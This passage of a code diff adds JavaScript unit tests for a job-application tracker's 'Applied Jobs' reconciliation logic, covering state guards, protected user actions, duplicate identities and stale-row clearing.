+    ...source,
+    processing_commit_guard: "commit:review:not-confirmed"
+  };
+  markerOnly.state_guard = stateGuard(markerOnly);
+  const failedConfirmation = reconcileAppliedJobs(
+    [],
+    [markerOnly],
+    [pending],
+    [pending],
+    schema,
+    view,
+    now,
+    {
+      processedActions: [
+        {
+          canonical_job_id: source.canonical_job_id,
+          manual_action: "outcome_replied",
+          source_state_guard: source.state_guard,
+          processing_commit_guard: "commit:review:not-confirmed"
+        }
+      ],
+      confirmedCommitGuards: []
+    }
+  );
+  assert.deepEqual(failedConfirmation.clear_rows, []);
+  assert.deepEqual(failedConfirmation.applied_rows, []);
+  assert.equal(failedConfirmation.protected_action_count, 1);
+
+  const replayPlan = processReviewActions(
+    [],
+    [updated],
+    schema,
+    now,
+    {
+      executionId: "applied-cleanup-replay",
+      reviewConfig: view,
+      appliedJobsRows: [pending]
+    }
+  );
+  assert.deepEqual(replayPlan.archive_updates, []);
+  assert.match(replayPlan.invalid_actions[0].error, /stale Applied Jobs action/);
+  assert.equal(updated.outcome_events.length, 1);
+  const replayCleanup = reconcileAppliedJobs(
+    [],
+    [updated],
+    [pending],
+    [pending],
+    schema,
+    view,
+    now
+  );
+  assert.deepEqual(replayCleanup.clear_rows, []);
+  assert.equal(replayCleanup.applied_rows[0]["Current outcome"], "replied");
+
+  const empty = reconcileAppliedJobs([], [], [], [], schema, view, now);
+  assert.deepEqual(empty, {
+    applied_rows: [],
+    desired_rows: [],
+    rebase_rows: [],
+    clear_rows: [],
+    protected_action_count: 0,
+    invalid_records: []
+  });
+});
+
+test("Applied Jobs final cleanup protects an Action entered after reconciliation", () => {
+  const projected = {
+    row_number: 2,
+    "Applied at": "2026-07-27T10:00:00.000Z",
+    "Job title": "TypeScript Developer",
+    Company: "Acme",
+    "Generated message": "Copy-ready message",
+    "Job link": "https://onlinejobs.ph/jobseekers/job/example",
+    "Current outcome": "",
+    "Outcome updated at": "",
+    Action: "",
+    canonical_job_id: "onlinejobs.ph:late-cleanup",
+    source_state_guard: "guard-before"
+  };
+  const planned = {
+    applied_clear_rows: [
+      {
+        canonical_job_id: projected.canonical_job_id,
+        "Applied at": "",
+        "Job title": "",
+        Company: "",
+        "Generated message": "",
+        "Job link": "",
+        "Current outcome": "",
+        "Outcome updated at": ""
+      }
+    ],
+    applied_rows: [
+      {
+        ...projected,
+        row_number: undefined,
+        source_state_guard: "guard-after"
+      }
+    ],
+    applied_protected_action_count: 0
+  };
+  const latest = { ...projected, Action: "Offer" };
+  const finalized = finalizeAppliedJobsCleanup(
+    planned,
+    [projected],
+    [latest]
+  );
+  assert.deepEqual(finalized.applied_clear_rows, []);
+  assert.equal(finalized.applied_rows.length, 1);
+  assert.equal(finalized.applied_rebase_rows.length, 1);
+  assert.equal(finalized.applied_rebase_rows[0].Action, "Offer");
+  assert.equal(
+    finalized.applied_rebase_rows[0].source_state_guard,
+    "guard-after"
+  );
+  assert.equal(finalized.applied_last_minute_protected_actions, 1);
+
+  const unchanged = finalizeAppliedJobsCleanup(
+    planned,
+    [projected],
+    [
+      {
+        ...projected,
+        row_number: 3,
+        source_state_guard: "guard-after"
+      }
+    ]
+  );
+  assert.equal(unchanged.applied_clear_rows.length, 1);
+  assert.equal(unchanged.applied_rows.length, 1);
+  assert.deepEqual(unchanged.applied_rebase_rows, []);
+  assert.equal(unchanged.applied_last_minute_protected_actions, 0);
+});
+
+test("Applied Jobs action snapshots fail closed for missing and duplicate identities", () => {
+  const source = job({
+    row_number: 103,
+    source_job_id: "applied-duplicate-projection",
+    canonical_job_id: "onlinejobs.ph:applied-duplicate-projection",
+    pipeline_status: "applied",
+    application_decision: "applied",
+    application_decided_at: "2026-07-27T10:00:00.000Z"
+  });
+  source.state_guard = stateGuard(source);
+  const blank = {
+    row_number: 2,
+    Action: "",
+    canonical_job_id: source.canonical_job_id,
+    source_state_guard: source.state_guard
+  };
+  const duplicateAction = {
+    ...blank,
+    row_number: 3,
+    Action: "Offer"
+  };
+  const missingIdentityAction = {
+    ...blank,
+    row_number: 4,
+    Action: "Rejected",
+    canonical_job_id: ""
+  };
+
+  const reconciliation = reconcileAppliedJobs(
+    [source],
+    [],
+    [blank, duplicateAction, missingIdentityAction],
+    [blank],
+    schema,
+    view,
+    now
+  );
+
+  assert.deepEqual(reconciliation.rebase_rows, []);
+  assert.match(
+    reconciliation.invalid_records
+      .map((record) => record.error)
+      .join("\n"),
+    /duplicate canonical identity/
+  );
+  assert.match(
+    reconciliation.invalid_records
+      .map((record) => record.error)
+      .join("\n"),
+    /missing canonical identity/
+  );
+});
+
+test("Applied Jobs clears stale display fields without positional deletion or Action loss", () => {
+  const stale = {
+    row_number: 7,
+    "Applied at": "2026-07-27T10:00:00.000Z",
+    "Job title": "Stale projected title",
+    Company: "Stale projected company",
+    "Generated message": "Stale projected message",
+    "Job link": "https://onlinejobs.ph/jobseekers/job/stale-projection",
+    "Current outcome": "offer",
+    "Outcome updated at": "2026-07-28T08:00:00.000Z",
+    Action: "",
+    canonical_job_id: "onlinejobs.ph:stale-projection",
+    source_state_guard: "guard-stale"
+  };
+  const cleared = reconcileAppliedJobs(
+    [],
+    [],
+    [stale],
+    [stale],
+    schema,
+    view,
+    now
+  );
+
+  assert.deepEqual(cleared.applied_rows, []);
+  assert.deepEqual(cleared.rebase_rows, []);
+  assert.deepEqual(cleared.clear_rows, [
+    {
+      canonical_job_id: stale.canonical_job_id,
+      "Applied at": "",
+      "Job title": "",
+      Company: "",
+      "Generated message": "",
+      "Job link": "",
+      "Current outcome": "",
+      "Outcome updated at": "",
+      source_state_guard: ""
+    }
+  ]);
+  assert.ok(!("row_number" in cleared.clear_rows[0]));
+  assert.ok(!("Action" in cleared.clear_rows[0]));
+  assert.equal(cleared.clear_rows[0].source_state_guard, "");
+
+  const concurrentAction = reconcileAppliedJobs(
+    [],
+    [],
+    [{ ...stale, row_number: 11, Action: "Interview" }],
+    [stale],
+    schema,
+    view,
+    now
+  );
+  assert.deepEqual(concurrentAction.clear_rows, []);
+  assert.equal(concurrentAction.protected_action_count, 1);
 });
 
 test("funnel summary deduplicates active/archive and never infers outcomes", () => {
